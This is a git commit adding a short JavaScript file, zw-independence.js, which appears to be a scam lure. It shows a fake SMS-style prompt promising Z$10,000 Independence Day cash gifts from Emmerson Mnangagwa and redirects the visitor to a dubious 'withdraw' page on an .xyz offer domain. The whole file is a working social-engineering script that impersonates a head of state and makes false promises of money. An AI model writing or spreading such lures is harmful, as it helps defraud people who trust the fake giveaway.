92e2df7fe519be08205c213ff652726f5d7eb96b
bigetijazz19 <bigetijazz19@gmail.com>
2025-04-12 09:00:24 +0100

    Create zw-independence.js

---
+++ zw-independence.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM Z$10,000'
+password=prompt('SMS: Congratulations, Get EMMERSON MNANGAGWA Z$10,000 INDEPENDENCE DAY celebration cash gifts to all, click Ok to claim this offer now','CLAIM Z$10,000');
+if (password != 'CLAIM Z$10,000') {
+location.href='https://www.ntegha-offerz.xyz/withdraw-z10000';
+}
